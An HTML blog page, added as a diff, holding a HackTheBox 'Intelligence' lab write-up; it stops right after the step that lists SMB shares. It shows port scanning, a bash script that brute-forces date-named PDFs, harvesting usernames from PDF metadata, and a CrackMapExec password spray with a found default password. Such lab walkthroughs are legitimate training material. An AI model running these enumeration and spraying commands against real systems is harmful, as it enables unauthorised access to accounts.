@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  HTB: Intelligence Writeup · mattjohnson.cloud
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="matt johnson">
+<meta name="description" content="HackTheBox&#39;s Intelligence was a fascinating machine mirroring real-world logic flaws in web applications and Active Directory attack paths. Additionally, one goes from unprivileged user all the way to root without ever gaining remote code execution on the machine itself, demonstrating the risk of information disclosure even in absence of clear attack vectors.">
+<meta name="keywords" content="blog,cloud,personal,security,windows,chess">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Intelligence Writeup">
+  <meta name="twitter:description" content="HackTheBox&#39;s Intelligence was a fascinating machine mirroring real-world logic flaws in web applications and Active Directory attack paths. Additionally, one goes from unprivileged user all the way to root without ever gaining remote code execution on the machine itself, demonstrating the risk of information disclosure even in absence of clear attack vectors.">
+
+<meta property="og:url" content="http://www.mattjohnson.de/posts/htb-intelligence/">
+  <meta property="og:site_name" content="mattjohnson.cloud">
+  <meta property="og:title" content="HTB: Intelligence Writeup">
+  <meta property="og:description" content="HackTheBox&#39;s Intelligence was a fascinating machine mirroring real-world logic flaws in web applications and Active Directory attack paths. Additionally, one goes from unprivileged user all the way to root without ever gaining remote code execution on the machine itself, demonstrating the risk of information disclosure even in absence of clear attack vectors.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-11-27T00:00:00+00:00">
+    <meta property="article:modified_time" content="2021-11-27T00:00:00+00:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Security">
+
+
+
+
+<link rel="canonical" href="http://www.mattjohnson.de/posts/htb-intelligence/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.7763f8bc6341ecf82378e867c285e1549abb063a899be313ccd25dbfcd24fa7d.css" integrity="sha256-d2P4vGNB7PgjeOhnwoXhVJq7BjqJm&#43;MTzNJdv80k&#43;n0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://www.mattjohnson.de/">
+      mattjohnson.cloud
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">about</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">tags</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://www.mattjohnson.de/posts/htb-intelligence/">
+              HTB: Intelligence Writeup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2021-11-27T00:00:00Z">
+                November 27, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              11-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/matt-johnson/">Matt Johnson</a></div>
+
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/hackthebox/">Hackthebox</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/security/">Security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <div class="custom-toc">
+    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#initial-access">Initial Access</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ol>
+</nav>
+</div>
+<h1 id="initial-access">
+  Initial Access
+  <a class="heading-link" href="#initial-access">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>To determine the active services running on the machine, I began by running an Nmap scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sC -sV -p- -v -oA nmap 10.10.10.248
+</span></span><span style="display:flex;"><span>    Nmap 7.91 scan initiated Mon Sep <span style="color:#a5d6ff">13</span> 21:13:46 <span style="color:#a5d6ff">2021</span> as: nmap -sC -sV -p- -v -oA nmap 10.10.10.248
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.248
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.14s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#a5d6ff">65515</span> filtered ports
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: Intelligence
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#ff7b72;font-weight:bold">(</span>server time: 2021-09-14 08:26:07Z<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#ff7b72;font-weight:bold">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: <span style="color:#79c0ff">commonName</span><span style="color:#ff7b72;font-weight:bold">=</span>dc.intelligence.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+</span></span><span style="display:flex;"><span>| Issuer: <span style="color:#79c0ff">commonName</span><span style="color:#ff7b72;font-weight:bold">=</span>intelligence-DC-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#a5d6ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-04-19T00:43:16
+</span></span><span style="display:flex;"><span>| Not valid after:  2022-04-19T00:43:16
+</span></span><span style="display:flex;"><span>| MD5:   <span style="color:#a5d6ff">7767</span> <span style="color:#a5d6ff">9533</span> 67fb d65d <span style="color:#a5d6ff">6065</span> dff7 7ad8 3e88
+</span></span><span style="display:flex;"><span>|_SHA-1: <span style="color:#a5d6ff">1555</span> 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
+</span></span><span style="display:flex;"><span>|_ssl-date: 2021-09-14T08:27:39+00:00; +7h04m41s from scanner time.
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#ff7b72;font-weight:bold">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: <span style="color:#79c0ff">commonName</span><span style="color:#ff7b72;font-weight:bold">=</span>dc.intelligence.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+</span></span><span style="display:flex;"><span>| Issuer: <span style="color:#79c0ff">commonName</span><span style="color:#ff7b72;font-weight:bold">=</span>intelligence-DC-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#a5d6ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-04-19T00:43:16
+</span></span><span style="display:flex;"><span>| Not valid after:  2022-04-19T00:43:16
+</span></span><span style="display:flex;"><span>| MD5:   <span style="color:#a5d6ff">7767</span> <span style="color:#a5d6ff">9533</span> 67fb d65d <span style="color:#a5d6ff">6065</span> dff7 7ad8 3e88
+</span></span><span style="display:flex;"><span>|_SHA-1: <span style="color:#a5d6ff">1555</span> 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
+</span></span><span style="display:flex;"><span>|_ssl-date: 2021-09-14T08:27:40+00:00; +7h04m41s from scanner time.
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#ff7b72;font-weight:bold">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: <span style="color:#79c0ff">commonName</span><span style="color:#ff7b72;font-weight:bold">=</span>dc.intelligence.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+</span></span><span style="display:flex;"><span>| Issuer: <span style="color:#79c0ff">commonName</span><span style="color:#ff7b72;font-weight:bold">=</span>intelligence-DC-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#a5d6ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-04-19T00:43:16
+</span></span><span style="display:flex;"><span>| Not valid after:  2022-04-19T00:43:16
+</span></span><span style="display:flex;"><span>| MD5:   <span style="color:#a5d6ff">7767</span> <span style="color:#a5d6ff">9533</span> 67fb d65d <span style="color:#a5d6ff">6065</span> dff7 7ad8 3e88
+</span></span><span style="display:flex;"><span>|_SHA-1: <span style="color:#a5d6ff">1555</span> 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
+</span></span><span style="display:flex;"><span>|_ssl-date: 2021-09-14T08:27:39+00:00; +7h04m41s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#ff7b72;font-weight:bold">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: <span style="color:#79c0ff">commonName</span><span style="color:#ff7b72;font-weight:bold">=</span>dc.intelligence.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+</span></span><span style="display:flex;"><span>| Issuer: <span style="color:#79c0ff">commonName</span><span style="color:#ff7b72;font-weight:bold">=</span>intelligence-DC-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#a5d6ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-04-19T00:43:16
+</span></span><span style="display:flex;"><span>| Not valid after:  2022-04-19T00:43:16
+</span></span><span style="display:flex;"><span>| MD5:   <span style="color:#a5d6ff">7767</span> <span style="color:#a5d6ff">9533</span> 67fb d65d <span style="color:#a5d6ff">6065</span> dff7 7ad8 3e88
+</span></span><span style="display:flex;"><span>|_SHA-1: <span style="color:#a5d6ff">1555</span> 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
+</span></span><span style="display:flex;"><span>|_ssl-date: 2021-09-14T08:27:40+00:00; +7h04m41s from scanner time.
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#ff7b72;font-weight:bold">(</span>SSDP/UPnP<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49692/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49702/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49714/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>63170/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 7h04m40s, deviation: 0s, median: 7h04m40s
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   2.02:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2021-09-14T08:27:02
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Nmap done at Mon Sep 13 21:23:00 2021 -- 1 IP address (1 host up) scanned in 553.52 seconds</span>
+</span></span></code></pre></div><p>The publically available ports indicate that this is an Active Directory Domain Controller. One of the first things I did was briefly enumerate DNS to see if I could find valid domains.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ dig axfr @10.10.10.248
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.248
+</span></span><span style="display:flex;"><span>; <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> server found<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#a5d6ff">4708</span> msec
+</span></span><span style="display:flex;"><span>;; SERVER: 10.10.10.248#53<span style="color:#ff7b72;font-weight:bold">(</span>10.10.10.248<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>;; WHEN: Mon Sep <span style="color:#a5d6ff">13</span> 21:53:03 EDT <span style="color:#a5d6ff">2021</span>
+</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd: <span style="color:#a5d6ff">28</span>
+</span></span></code></pre></div><p>After that yielded no results, I moved on to SMB enumeration. I attempted both anonymous login and null authentication, however wasn’t able to gain anything meaningful out of the service.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient -L <span style="color:#79c0ff">\\\\</span>10.10.10.248<span style="color:#79c0ff">\\</span>
+</span></span><span style="display:flex;"><span>Enter WORKGROUP<span style="color:#79c0ff">\k</span>ali<span style="color:#79c0ff">\&#39;</span>s password:
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>SMB1 disabled -- no workgroup available
+</span></span></code></pre></div><p>Moving on to the web, I began manual enumeration of the website.</p>
+<p><img src="web0.png" alt="Web Home Page"></p>
+<p><img src="web1.png" alt="location of PDF files"></p>
+<p>From the main page of the site, there are two PDF files available for viewing. While the PDFs themselves were of no use to us, the naming conventions utilized for the files do provide an interesting path for further enumeration. The basic convention is as follows: <code>YYYY-MM-DD-upload.pdf</code>. With that knowledge, I was able to create and run a script that would iterate over all dates in 2020 and 2021, request each respective file, view the HTTP response code to determine whether any files exist, and download the file if the server responds with <code>200</code>. Here’s how that script looks:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">URL</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;http://10.10.10.248/documents/&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> <span style="color:#ff7b72;font-weight:bold">((</span> <span style="color:#79c0ff">i</span> <span style="color:#ff7b72;font-weight:bold">=</span> 2020; i &lt; 2022; i++ <span style="color:#ff7b72;font-weight:bold">))</span>      <span style="color:#8b949e;font-style:italic">### Outer for loop ###</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">do</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> j in 0<span style="color:#ff7b72;font-weight:bold">{</span>1..9<span style="color:#ff7b72;font-weight:bold">}</span> <span style="color:#ff7b72;font-weight:bold">{</span>10..12<span style="color:#ff7b72;font-weight:bold">}</span> ; <span style="color:#8b949e;font-style:italic">### Inner for loop ###</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">do</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> k in 0<span style="color:#ff7b72;font-weight:bold">{</span>1..9<span style="color:#ff7b72;font-weight:bold">}</span> <span style="color:#ff7b72;font-weight:bold">{</span>10..31<span style="color:#ff7b72;font-weight:bold">}</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">do</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#79c0ff">HTTP_CODE</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>curl -s -o /dev/null -w <span style="color:#a5d6ff">&#34;%{http_code}&#34;</span> <span style="color:#79c0ff">$URL$i</span>-<span style="color:#79c0ff">$j</span>-<span style="color:#79c0ff">$k</span>-upload.pdf<span style="color:#ff7b72">)</span>
+</span></span><span style="display:flex;"><span>                    echo <span style="color:#79c0ff">$HTTP_CODE</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#79c0ff">$HTTP_CODE</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">200</span> <span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff7b72">then</span>
+</span></span><span style="display:flex;"><span>                            echo <span style="color:#a5d6ff">&#39;Downloading file...&#39;</span>
+</span></span><span style="display:flex;"><span>                            wget <span style="color:#79c0ff">$URL$i</span>-<span style="color:#79c0ff">$j</span>-<span style="color:#79c0ff">$k</span>-upload.pdf -O <span style="color:#79c0ff">$i</span>-<span style="color:#79c0ff">$j</span>-<span style="color:#79c0ff">$k</span>-upload.pdf
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff7b72">fi</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">done</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">done</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#34;&#34;</span> <span style="color:#8b949e;font-style:italic">#### print the new line ###</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">done</span>
+</span></span></code></pre></div><p>Having successfully enumerated and downloaded all files following that convention, I performed two subsequent tasks.</p>
+<p>First, I pulled down the metadata of each file to find its creator and create a list of potential Active Directory users.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence/pdf<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ <span style="color:#ff7b72">for</span> i in 202*; <span style="color:#ff7b72">do</span> pdfinfo <span style="color:#79c0ff">$i</span> | grep <span style="color:#a5d6ff">&#39;Creator&#39;</span> | awk -F<span style="color:#a5d6ff">&#39; &#39;</span> <span style="color:#a5d6ff">&#39;{print $(NF)}&#39;</span>; <span style="color:#ff7b72">done</span> &gt;&gt; users.lst
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence/pdf<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat users.lst
+</span></span><span style="display:flex;"><span>William.Lee
+</span></span><span style="display:flex;"><span>Scott.Scott
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Second, I manually inspected each file to see if the document itself contained any useful information. One of the files contained the default password used to set up accounts.</p>
+<p><img src="web2.png" alt="PDF with default password"></p>
+<p>Armed with a listing of potential users and a default password, I performed a password spray attack and found that the credentials were valid for the <code>Tiffany.Molina</code> user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence/pdf<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ crackmapexec smb -u users.lst -p NewIntelligenceCorpUser9876 -d intelligence.htb 10.10.10.248
+</span></span><span style="display:flex;"><span>SMB         10.10.10.248    <span style="color:#a5d6ff">445</span>    DC               <span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Windows 10.0 Build <span style="color:#a5d6ff">17763</span> x64 <span style="color:#ff7b72;font-weight:bold">(</span>name:DC<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>domain:intelligence.htb<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>signing:True<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>SMBv1:False<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.10.248    <span style="color:#a5d6ff">445</span>    DC               <span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> intelligence.htb<span style="color:#79c0ff">\W</span>illiam.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.10.248    <span style="color:#a5d6ff">445</span>    DC               <span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> intelligence.htb<span style="color:#79c0ff">\S</span>cott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>SMB         10.10.10.248    <span style="color:#a5d6ff">445</span>    DC               <span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> intelligence.htb<span style="color:#79c0ff">\T</span>iffany.Molina:NewIntelligenceCorpUser9876
+</span></span></code></pre></div><h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>With valid credentials, I once again enumerated SMB to see if I had access to execute code or read any interesting shares:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/intelligence/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> IP: 10.10.10.248:445        Name: intelligence.htb
+</span></span><span style="display:flex;"><span>        Disk                                                    Permissions     Comment
+</span></span><span style="display:flex;"><span>        ----                                                    -----------     -------
+</span></span><span style="display:flex;"><span>        ADMIN$                                                  NO ACCESS       Remote Admin
+</span></span><span style="display:flex;"><span>        C$                                                      NO ACCESS       Default share
+</span></span><span style="display:flex;"><span>        IPC$                                                    READ ONLY       Remote IPC
+</span></span><span style="display:flex;"><span>        IT                                                      READ ONLY
+</span></span><span style="display:flex;"><span>        NETLOGON                                                READ ONLY       Logon server share
+</span></span><span style="display:flex;"><span>        SYSVOL                                                  READ ONLY       Logon server share
+</span></span><span style="display:flex;"><span>        Users                                                   READ ONLY
+</span></span></code></pre></div><p>I found that the controlled user had read access to the <code>IT</code> share, which contained an interesting script:</p>
